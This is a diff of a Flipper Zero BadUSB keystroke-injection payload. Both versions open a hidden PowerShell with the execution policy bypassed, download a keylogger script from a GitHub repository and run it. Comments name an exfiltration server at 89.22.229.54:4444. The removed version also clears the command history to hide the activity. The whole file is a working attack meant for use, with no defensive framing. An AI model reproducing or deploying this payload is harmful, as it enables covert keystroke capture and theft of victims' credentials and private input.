@@ -1,28 +1,12 @@
-REM Flipper Zero BadUSB - Keylogger Injection
-REM Server: 89.22.229.54:4444
+REM Flipper Zero BadUSB - load keylogger.ps1 from this repo, exfil TCP 89.22.229.54:4444
+REM Layout: US English. SD path: badusb/payload.txt (or any name under badusb/)
+REM Repo: https://github.com/naturalniyaboba2077/flipper-keylogger
 
-DEFAULT_DELAY 200
-DEFAULT_STRING_DELAY 15
-
-REM Открываем Run
+DELAY 2500
 GUI r
-DELAY 500
-
-REM Запускаем PowerShell
-STRING powershell -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass
+DELAY 600
+STRING powershell -NoP -NonI -W Hidden -Ep Bypass
 ENTER
-DELAY 1500
-
-REM Скачиваем и выполняем с GitHub (ЗАМЕНИТЕ yourusername)
-STRING iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1')
+DELAY 1200
+STRING $u='https://raw.githubusercontent.com/naturalniyaboba2077/flipper-keylogger/main/keylogger.ps1'; $p=Join-Path $env:TEMP 'keylogger.ps1'; try{(New-Object Net.WebClient).DownloadFile($u,$p)}catch{Invoke-WebRequest -Uri $u -OutFile $p -UseBasicParsing}; Start-Process powershell -WindowStyle Hidden -ArgumentList '-NoP','-NonI','-W','Hidden','-Ep','Bypass','-File',$p; exit
 ENTER
-DELAY 2000
-
-REM Очищаем историю
-STRING Clear-History
-ENTER
-DELAY 300
-STRING exit
-ENTER
-DELAY 300
-ALT F4
